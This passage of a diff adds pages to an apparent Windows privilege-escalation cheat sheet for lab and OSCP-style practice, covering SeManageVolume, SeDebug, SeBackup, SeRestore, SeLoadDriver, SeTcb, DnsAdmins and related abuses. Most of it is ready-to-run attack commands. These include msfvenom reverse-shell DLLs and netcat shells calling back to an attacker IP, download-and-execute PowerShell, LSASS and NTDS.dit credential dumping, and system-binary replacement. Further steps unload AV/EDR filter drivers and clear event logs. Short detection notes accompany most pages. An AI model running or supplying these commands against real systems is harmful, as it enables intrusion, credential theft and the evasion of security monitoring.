+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">svc_mssql, backup services, domain svc accounts</div></div>
+        <div class="info-card"><div class="info-label">Attack Chain</div><div class="info-value">Volume DACL abuse → C:\Windows write → PrintConfig DLL hijack</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
+        <div class="info-card"><div class="info-label">Key Tool</div><div class="info-value">SeManageVolumeExploit.exe (CsEnox)</div></div>
+      </div>
+
+      <div class="alert alert-purple">
+        <span class="alert-icon">🟣</span>
+        <span>This is the exact vector used on the <strong>Access</strong> machine (PG Practice). The exploit grants full permissions on C:\ to all users, then you drop a malicious DLL to be loaded by the PrintNotify service.</span>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Full Attack Chain — Step by Step</div>
+        <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">SeManageVolumePrivilege</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Run exploit.exe</div><div class="flow-arrow">→</div>
+            <div class="flow-node">C:\ DACL → Everyone:Full</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Drop malicious PrintConfig.dll</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Trigger PrintNotify</div><div class="flow-arrow">→</div>
+            <div class="flow-node">🎯 SYSTEM</div>
+          </div>
+
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Verify the privilege</div>
+              <div class="code-block">whoami /priv | findstr SeManageVolume</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Transfer SeManageVolumeExploit.exe from attacker</div>
+              <div class="code-block">iwr http://192.168.45.250/SeManageVolumeExploit.exe -o sme.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Run the exploit — grants C:\ full permissions</div>
+              <div class="code-block purple">.\sme.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Generate malicious PrintConfig.dll on Kali</div>
+              <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=5555 -f dll -o PrintConfig.dll</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">Transfer the DLL to target</div>
+              <div class="code-block">iwr http://192.168.45.250/PrintConfig.dll -o C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">6</div>
+            <div class="step-content">
+              <div class="step-title">Start listener on Kali</div>
+              <div class="code-block">nc -lvnp 5555</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">7</div>
+            <div class="step-content">
+              <div class="step-title">Trigger PrintNotify service via CLSID (from the screenshots)</div>
+              <div class="code-block purple">$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$object = [Activator]::CreateInstance($type)</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">⚠️</span>
+            <span>The DLL must be at exactly: <code>C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll</code></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔗 Resources</div>
+        <div class="section-body">
+          <ul style="font-family:'Share Tech Mono',monospace;font-size:12px;list-style:none;padding:0;">
+            <li style="margin-bottom:8px;">🔗 <a href="https://github.com/CsEnox/SeManageVolumeExploit" target="_blank">github.com/CsEnox/SeManageVolumeExploit</a> — Official exploit</li>
+            <li style="margin-bottom:8px;">📝 <a href="https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9" target="_blank">Medium Writeup — Access (PG Practice)</a></li>
+            <li style="margin-bottom:8px;">📝 <a href="https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13" target="_blank">Sliver C2 writeup on Access box</a></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">DACL modification on C:\ root • New DLL in C:\Windows\System32\spool\drivers\x64\3\ • PrintNotify service starting unexpectedly • Event 4674 on volume objects</div>
+      </div>
+    </div>
+
+    <!-- SeDebugPrivilege -->
+    <div id="page-sedebug" class="page">
+      <div class="page-header">
+        <div class="page-title">🐛 SeDebugPrivilege <span class="severity-badge sev-critical">CRITICAL</span></div>
+        <div class="page-sub">// READ/WRITE ANY PROCESS MEMORY → LSASS DUMP → TOKEN THEFT</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Local admins, developers, some service accts</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Dump LSASS → steal SYSTEM token</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Plaintext creds + SYSTEM token</div></div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Attack Options</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Dump LSASS with procdump</div>
+              <div class="code-block">.\procdump.exe -ma lsass.exe lsass.dmp
+# Kali:
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Task Manager dump (GUI)</div>
+              <div class="code-block">Details tab → right-click lsass.exe → Create dump file</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Token duplication → SYSTEM process injection</div>
+              <div class="code-block"># With Meterpreter
+getsystem -t 1  # Token impersonation via SeDebug</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">psgetsys.ps1 — duplicate SYSTEM token</div>
+              <div class="code-block green">IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.250/psgetsys.ps1')
+ImpersonateFromParentPid -ppid (Get-Process winlogon).Id</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4656 — handle request to lsass.exe • Access mask 0x1FFFFF on lsass • Procdump running • LSASS memory access by non-SYSTEM process</div>
+      </div>
+    </div>
+
+    <!-- SeBackupPrivilege -->
+    <div id="page-sebackup" class="page">
+      <div class="page-header">
+        <div class="page-title">💾 SeBackupPrivilege <span class="severity-badge sev-rare">RARE</span></div>
+        <div class="page-sub">// READ ANY FILE BYPASSING ACL → STEAL NTDS.DIT → ALL DOMAIN HASHES</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Backup Operators group members</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Copy NTDS.dit via VSS/diskshadow</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">All domain NTLM hashes → DA PTH</div></div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Full Attack — Steal NTDS.dit</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Create VSS script (diskshadow)</div>
+              <div class="code-block">echo "set context persistent nowriters" > pwn.dsh
+echo "add volume c: alias pwn" >> pwn.dsh
+echo "create" >> pwn.dsh
+echo "expose %pwn% z:" >> pwn.dsh
+unix2dos pwn.dsh</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Run diskshadow</div>
+              <div class="code-block purple">diskshadow.exe /s pwn.dsh</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Import SeBackupPrivilege cmdlets + copy NTDS.dit</div>
+              <div class="code-block purple">Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Save SYSTEM hive</div>
+              <div class="code-block">reg save HKLM\SYSTEM C:\temp\system</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">Dump hashes on Kali</div>
+              <div class="code-block green">impacket-secretsdump -ntds ntds.dit -system system LOCAL</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Tool: <a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank">github.com/giuliano108/SeBackupPrivilege</a> | Writeup: <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank">hackingarticles.in</a></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">VSS snapshot creation • diskshadow.exe executed • File copy from shadow copy path • NTDS.dit accessed • Event 4656 with backup semantics flag</div>
+      </div>
+    </div>
+
+    <!-- SeRestorePrivilege -->
+    <div id="page-serestore" class="page">
+      <div class="page-header">
+        <div class="page-title">📝 SeRestorePrivilege <span class="severity-badge sev-rare">RARE</span></div>
+        <div class="page-sub">// WRITE ANY FILE BYPASSING ACL → REPLACE SYSTEM BINARIES → SYSTEM</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Backup Operators, restore service accounts</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Replace utilman.exe or service binary</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">SYSTEM shell</div></div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Attack — utilman.exe swap</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Use SeRestoreAbuse.exe to write privileged file</div>
+              <div class="code-block">.\SeRestoreAbuse.exe "cmd /c copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Alternative: drop reverse shell instead</div>
+              <div class="code-block purple">.\SeRestoreAbuse.exe "cmd /c copy \\{{KALI_IP}}\share\shell.exe C:\Windows\System32\utilman.exe"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Lock screen → Win+U = SYSTEM cmd</div>
+              <div class="code-block"># On RDP: lock screen and press Win+U (Ease of Access button)</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Alternative: overwrite a service binary in Program Files with a reverse shell payload.</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Tool: <a href="https://github.com/xct/SeRestoreAbuse" target="_blank">github.com/xct/SeRestoreAbuse</a></span>
+          </div>
+        </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Write to C:\Windows\System32\ by non-SYSTEM user • utilman.exe or sethc.exe modified • Event 4663 write access on system binaries</div>
+      </div>
+    </div>
+
+    <!-- SeTakeOwnershipPrivilege -->
+    <div id="page-setakeown" class="page">
+      <div class="page-header">
+        <div class="page-title">👑 SeTakeOwnershipPrivilege <span class="severity-badge sev-rare">RARE</span></div>
+        <div class="page-sub">// TAKE OWNERSHIP OF ANY OBJECT → MODIFY DACL → WRITE → SYSTEM</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Admins, sometimes delegated svc accounts</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Own file → add write ACE → replace binary</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">SYSTEM (via svc binary or reg key)</div></div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Attack Chain</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Take ownership of target file</div>
+              <div class="code-block">takeown /f C:\Windows\System32\utilman.exe
+# Or for a registry key:
+takeown /f "HKLM\SYSTEM\CurrentControlSet\Services\vuln_svc" /a</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Grant yourself full control</div>
+              <div class="code-block">icacls C:\Windows\System32\utilman.exe /grant "%USERNAME%":F</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Replace with payload / cmd.exe</div>
+              <div class="code-block purple">copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+# Or copy reverse shell payload</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">PowerShell version (more reliable)</div>
+              <div class="code-block green">$file = "C:\Windows\System32\utilman.exe"
+$acl = Get-Acl $file
+$acl.SetOwner([System.Security.Principal.NTAccount]"$env:USERDOMAIN\$env:USERNAME")
+Set-Acl $file $acl
+$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("$env:USERNAME","FullControl","Allow")
+$acl.AddAccessRule($rule)
+Set-Acl $file $acl</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4670 — permissions on object changed • takeown.exe execution • icacls modifying System32 files • Ownership change on system binaries</div>
+      </div>
+    </div>
+
+    <!-- SeLoadDriverPrivilege -->
+    <div id="page-seloaddriver" class="page">
+      <div class="page-header">
+        <div class="page-title">🔩 SeLoadDriverPrivilege <span class="severity-badge sev-rare">RARE</span></div>
+        <div class="page-sub">// LOAD KERNEL DRIVER → EXPLOIT VULN DRIVER → SYSTEM</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Print Operators, some delegated accounts</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Load Capcom/szkg64 vuln driver → kernel exploit</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Attack — Load Vulnerable Driver</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Use EOPLOADDRIVER to load the vulnerable driver</div>
+              <div class="code-block">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Run exploit against Capcom driver</div>
+              <div class="code-block purple">.\ExploitCapcom.exe EXPLOITPATH C:\temp\shell.exe
+# ⚠ Capcom.sys is BLOCKED by Windows Driver Blocklist on Win11 22000.194+ and patched Server 2022
+# Use szkg64.sys (Step 3) on modern targets instead</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Preferred on modern targets: szkg64.sys (CVE-2018-15732)</div>
+              <div class="code-block">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\szkg64.sys
+# Then exploit via kernel vuln</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Unload security drivers (bypass AV/EDR)</div>
+              <div class="code-block orange">fltMC unload sysmondrv
+fltMC unload WdFilter</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Tools: <a href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">github.com/k4sth4/SeLoadDriverPrivilege</a> | <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" target="_blank">Tarlogic writeup</a></span>
+          </div>
+        </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 7045 — new service/driver installed • Unsigned driver load • fltMC unloading security drivers • New registry key under CurrentControlSet\Services</div>
+      </div>
+    </div>
+
+    <!-- SeTcbPrivilege -->
+    <div id="page-setcb" class="page">
+      <div class="page-header">
+        <div class="page-title">🏛️ SeTcbPrivilege <span class="severity-badge sev-rare">RARE / EXTREME</span></div>
+        <div class="page-sub">// ACT AS PART OF OS → CREATE SYSTEM TOKENS → INSTANT SYSTEM</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Rarely delegated — very powerful</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">TcbElevation.exe → spawn SYSTEM process</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Attack</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Use TcbElevation.exe (antonioCoco)</div>
+              <div class="code-block purple">iwr http://192.168.45.250/TcbElevation.exe -o TcbElevation.exe
+.\TcbElevation.exe pwn "C:\Windows\system32\cmd.exe /c nc64.exe 192.168.45.250 4444 -e cmd"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Alternative: LsaLogonUser abuse (create token with SeTcb)</div>
+              <div class="code-block"># SeTcbPrivilege allows calling LsaLogonUser without credentials
+# → create a SYSTEM-level token → spawn process</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Gist: <a href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178" target="_blank">gist.github.com/antonioCoco/TcbElevation</a></span>
+          </div>
+        </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">🔍 Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">LsaLogonUser call from non-system process • Event 4672 SeTcbPrivilege assigned • Unusual service installation spawning SYSTEM child process</div>
+      </div>
+    </div>
+
+    <!-- SeCreateTokenPrivilege -->
+    <div id="page-secreatetoken" class="page">
+      <div class="page-header">
+        <div class="page-title">🪙 SeCreateTokenPrivilege <span class="severity-badge sev-rare">VERY RARE</span></div>
+        <div class="page-sub">// FORGE ARBITRARY ACCESS TOKEN WITH ANY PRIVILEGES → SYSTEM</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Almost never delegated — extremely rare</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">NtCreateToken with admin groups</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Local Administrator / SYSTEM</div></div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">⚡ Attack</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Compile + run PrivFu CreateTokenVariant (daem0nc0re)</div>
+              <div class="code-block purple"># Build from source: github.com/daem0nc0re/PrivFu → CreateTokenVariant
+.\CreateTokenVariant.exe
+# Calls NtCreateToken to forge a token with Administrators SID (S-1-5-32-544)</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">⚠ CRITICAL: SeCreateTokenPrivilege alone is not enough</div>
+              <div class="code-block orange"># You MUST also have SeImpersonatePrivilege OR SeAssignPrimaryTokenPrivilege
+# to actually USE the forged token. Without one of these, the token cannot be applied.
+whoami /priv | findstr "SeImpersonate\|SeAssignPrimary"</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Tools: <a href="https://github.com/hatRiot/token-priv" target="_blank">github.com/hatRiot/token-priv</a> | <a href="https://github.com/daem0nc0re/PrivFu" target="_blank">github.com/daem0nc0re/PrivFu</a></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SeSecurityPrivilege -->
+    <div id="page-sesecurity" class="page">
+      <div class="page-header">
+        <div class="page-title">🔐 SeSecurityPrivilege <span class="severity-badge sev-gold">UNCOMMON</span></div>
+        <div class="page-sub">// MANAGE AUDIT LOG → READ SECURITY LOG → CLEAR EVENTS → OPSEC</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Attacks</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Clear Security event log (cover tracks)</div>
+              <div class="code-block orange">wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Read Security log (intel gathering)</div>
+              <div class="code-block">wevtutil qe Security /c:50 /rd:true /f:text</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Read SACL on objects (audit settings)</div>
+              <div class="code-block">Get-Acl C:\Windows\System32\lsass.exe | Select-Object Audit</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Primary value: log clearing for opsec, and reading security events to understand what's being monitored.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SeCreateSymbolicLink -->
+    <div id="page-sesymlink" class="page">
+      <div class="page-header">
+        <div class="page-title">🔗 SeCreateSymbolicLinkPrivilege <span class="severity-badge sev-gold">UNCOMMON</span></div>
+        <div class="page-sub">// SYMLINK ATTACKS → REDIRECT FILE OPS TO PRIVILEGED LOCATIONS</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Symlink Attack</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Create symlink from writable location → privileged file</div>
+              <div class="code-block purple">cmd /c mklink C:\Temp\target.dll C:\Windows\System32\target.dll
+# Or PS:
+New-Item -ItemType SymbolicLink -Path C:\Temp\link -Target C:\Windows\System32\vuln.dll</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Combine with a service that writes to a writable path</div>
+              <div class="code-block">
+# If a SYSTEM service writes to C:\Temp\log.txt:
+# Create symlink: C:\Temp\log.txt → C:\Windows\System32\target_dll
+# Service write goes to System32 instead</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>This is most powerful when chained with a service that writes predictably to a user-controlled path. Look for services writing logs to temp folders.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SeSystemEnvironmentPrivilege -->
+    <div id="page-sesysenv" class="page">
+      <div class="page-header">
+        <div class="page-title">⚙️ SeSystemEnvironmentPrivilege <span class="severity-badge sev-gold">UNCOMMON</span></div>
+        <div class="page-sub">// MODIFY UEFI/FIRMWARE VARS → PERSISTENT BOOTKIT / BYPASS SECUREBOOT</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Attack — Firmware Variable Abuse</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Read/write UEFI variables via PowerShell</div>
+              <div class="code-block purple">[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
+# Use GetFirmwareEnvironmentVariable / SetFirmwareEnvironmentVariable Win32 APIs</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Primary use case: persistent implant in firmware</div>
+              <div class="code-block orange"># Advanced — used for UEFI-level persistence beyond OS reinstall
+# Also abusable to corrupt boot configuration</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Rarely seen in OSCP labs — more relevant in red team/APT simulation. If present, check for boot config manipulation.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SeShutdownPrivilege -->
+    <div id="page-seshutdown" class="page">
+      <div class="page-header">
+        <div class="page-title">⛔ SeShutdownPrivilege <span class="severity-badge sev-gold">SITUATIONAL</span></div>
+        <div class="page-sub">// FORCE REBOOT → TRIGGER SERVICE RESTART → EXPLOIT RACE CONDITIONS</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Situational Uses</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Force restart (trigger autorun/service start)</div>
+              <div class="code-block">shutdown /r /t 0</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Use with DLL hijack — restart service without rebooting</div>
+              <div class="code-block">sc stop VulnerableService
+sc start VulnerableService</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Useful when you've planted a payload that needs a reboot to trigger (service, Run key, scheduled task). Also useful for race condition exploits.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SeAssignPrimaryToken -->
+    <div id="page-seassignprimary" class="page">
+      <div class="page-header">
+        <div class="page-title">🎫 SeAssignPrimaryTokenPrivilege <span class="severity-badge sev-critical">CRITICAL</span></div>
+        <div class="page-sub">// REPLACE PROCESS TOKEN → POTATO FAMILY → SYSTEM</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Service accounts (often alongside SeImpersonate)</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Potato family (same as SeImpersonate)</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Same Arsenal as SeImpersonate</div>
+        <div class="section-body">
+          <div class="code-block green">.\GodPotato-NET4.exe -cmd "cmd /c nc64.exe 192.168.45.250 4444 -e cmd"
+.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c nc64.exe 192.168.45.250 4444 -e cmd"
+.\PrintSpoofer.exe -c "nc64.exe 192.168.45.250 4444 -e cmd"</div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">💡</span>
+            <span>SeAssignPrimaryTokenPrivilege + SeImpersonatePrivilege together = every Potato attack works. Check FullPowers if one is missing.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Backup Operators Group -->
+    <div id="page-backupops" class="page">
+      <div class="page-header">
+        <div class="page-title">👥 Backup Operators Group <span class="severity-badge sev-rare">RARE</span></div>
+        <div class="page-sub">// MEMBERSHIP → SeBackup + SeRestore → NTDS.DIT → ALL HASHES</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Full Attack Chain</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Check if in group</div>
+              <div class="code-block">net localgroup "Backup Operators"
+whoami /groups | findstr /i backup</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Note: Evil-WinRM strips privileges — use PSRemoting instead</div>
+              <div class="code-block gold">$sess = New-PSSession -ComputerName localhost -Credential (Get-Credential)
+Enter-PSSession $sess</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Then follow SeBackupPrivilege chain → NTDS.dit steal</div>
+              <div class="code-block"># See SeBackupPrivilege page for full steps</div>
+            </div>
+          </div>
+          <div class="alert alert-critical">
+            <span class="alert-icon">🔴</span>
+            <span>Evil-WinRM removes SeBackupPrivilege and SeRestorePrivilege from your token! Use a native PSRemoting session to retain them.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- DnsAdmins -->
+    <div id="page-dnsadmins" class="page">
+      <div class="page-header">
+        <div class="page-title">🌐 DnsAdmins → SYSTEM <span class="severity-badge sev-rare">RARE</span></div>
+        <div class="page-sub">// DnsAdmins GROUP → LOAD DLL IN DNS SERVICE → SYSTEM ON DC</div>
+      </div>
+      <div class="section">
+        <div class="section-header">⚡ Full Attack</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Check membership</div>
+              <div class="code-block">net localgroup DnsAdmins</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Generate malicious DLL on Kali</div>
+              <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=4444 -f dll -o evil.dll</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Host on SMB share or local path</div>
+              <div class="code-block">impacket-smbserver share . -smb2support</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Configure DNS server to load your DLL</div>
+              <div class="code-block purple">dnscmd dc01 /config /serverlevelplugindll \\192.168.45.250\share\evil.dll
+# Replace "dc01" with the DC hostname; omit if running directly on the DC</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
